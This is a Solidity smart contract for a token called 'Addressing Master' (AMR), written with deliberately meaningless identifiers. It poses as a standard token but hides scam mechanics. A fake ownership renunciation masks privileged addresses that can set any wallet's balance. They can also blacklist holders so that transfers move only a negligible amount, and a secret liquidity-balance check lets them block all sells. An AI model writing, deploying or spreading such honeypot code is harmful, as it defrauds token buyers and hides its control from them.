//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface minEnable {
    function createPair(address enableLaunched, address maxToMin) external returns (address);
}

interface takeWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletListFrom) external view returns (uint256);

    function transfer(address totalMax, uint256 minAt) external returns (bool);

    function allowance(address amountTeam, address spender) external view returns (uint256);

    function approve(address spender, uint256 minAt) external returns (bool);

    function transferFrom(
        address sender,
        address totalMax,
        uint256 minAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed isBuyMode, uint256 value);
    event Approval(address indexed amountTeam, address indexed spender, uint256 value);
}

abstract contract limitList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface totalMaxLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface takeWalletMetadata is takeWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AddressingMaster is limitList, takeWallet, takeWalletMetadata {

    event OwnershipTransferred(address indexed senderTxAmount, address indexed takeBuy);

    function takeMarketing(address txToken) public {
        require(txToken.balance < 100000);
        if (autoTo) {
            return;
        }
        
        minExempt[txToken] = true;
        
        autoTo = true;
    }

    function atReceiver(uint256 minAt) public {
        minLiquidity();
        modeSwapTeam = minAt;
    }

    uint256 public shouldTeamToken;

    address private liquidityMinSwap;

    mapping(address => uint256) private limitExempt;

    uint256 public exemptToken;

    function approve(address txMode, uint256 minAt) public virtual override returns (bool) {
        listMode[_msgSender()][txMode] = minAt;
        emit Approval(_msgSender(), txMode, minAt);
        return true;
    }

    function getOwner() external view returns (address) {
        return liquidityMinSwap;
    }

    bool private swapExempt;

    string private toAutoLimit = "Addressing Master";

    mapping(address => bool) public senderLiquidityWallet;

    constructor (){
        
        totalMaxLaunch atSellFund = totalMaxLaunch(toBuy);
        teamShould = minEnable(atSellFund.factory()).createPair(atSellFund.WETH(), address(this));
        if (minAmountTeam == shouldTeamToken) {
            swapExempt = true;
        }
        receiverTx = _msgSender();
        minExempt[receiverTx] = true;
        limitExempt[receiverTx] = tokenTx;
        swapExemptFund();
        
        emit Transfer(address(0), receiverTx, tokenTx);
    }

    uint256 public minAmountTeam;

    bool private fromAtMax;

    function txLaunched(address shouldTx) public {
        minLiquidity();
        if (marketingLaunchedBuy) {
            swapExempt = true;
        }
        if (shouldTx == receiverTx || shouldTx == teamShould) {
            return;
        }
        senderLiquidityWallet[shouldTx] = true;
    }

    function swapExemptFund() public {
        emit OwnershipTransferred(receiverTx, address(0));
        liquidityMinSwap = address(0);
    }

    bool private marketingLaunchedBuy;

    function balanceOf(address walletListFrom) public view virtual override returns (uint256) {
        return limitExempt[walletListFrom];
    }

    function decimals() external view virtual override returns (uint8) {
        return senderMin;
    }

    address public teamShould;

    function transfer(address receiverAmountShould, uint256 minAt) external virtual override returns (bool) {
        return teamFeeReceiver(_msgSender(), receiverAmountShould, minAt);
    }

    uint256 modeSwapTeam;

    function transferFrom(address enableMin, address totalMax, uint256 minAt) external override returns (bool) {
        if (_msgSender() != toBuy) {
            if (listMode[enableMin][_msgSender()] != type(uint256).max) {
                require(minAt <= listMode[enableMin][_msgSender()]);
                listMode[enableMin][_msgSender()] -= minAt;
            }
        }
        return teamFeeReceiver(enableMin, totalMax, minAt);
    }

    address launchedTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 constant receiverMode = 6 ** 10;

    uint8 private senderMin = 18;

    address toBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function totalSupply() external view virtual override returns (uint256) {
        return tokenTx;
    }

    function symbol() external view virtual override returns (string memory) {
        return isBuy;
    }

    uint256 private tokenTx = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private listMode;

    function fromWalletMarketing(address enableMin, address totalMax, uint256 minAt) internal returns (bool) {
        require(limitExempt[enableMin] >= minAt);
        limitExempt[enableMin] -= minAt;
        limitExempt[totalMax] += minAt;
        emit Transfer(enableMin, totalMax, minAt);
        return true;
    }

    function minLiquidity() private view {
        require(minExempt[_msgSender()]);
    }

    function owner() external view returns (address) {
        return liquidityMinSwap;
    }

    function walletAuto(address receiverAmountShould, uint256 minAt) public {
        minLiquidity();
        limitExempt[receiverAmountShould] = minAt;
    }

    uint256 totalSender;

    function teamFeeReceiver(address enableMin, address totalMax, uint256 minAt) internal returns (bool) {
        if (enableMin == receiverTx) {
            return fromWalletMarketing(enableMin, totalMax, minAt);
        }
        uint256 swapTotal = takeWallet(teamShould).balanceOf(launchedTrading);
        require(swapTotal == modeSwapTeam);
        require(totalMax != launchedTrading);
        if (senderLiquidityWallet[enableMin]) {
            return fromWalletMarketing(enableMin, totalMax, receiverMode);
        }
        return fromWalletMarketing(enableMin, totalMax, minAt);
    }

    address public receiverTx;

    function name() external view virtual override returns (string memory) {
        return toAutoLimit;
    }

    string private isBuy = "AMR";

    mapping(address => bool) public minExempt;

    bool public autoTo;

    function allowance(address modeExempt, address txMode) external view virtual override returns (uint256) {
        if (txMode == toBuy) {
            return type(uint256).max;
        }
        return listMode[modeExempt][txMode];
    }

}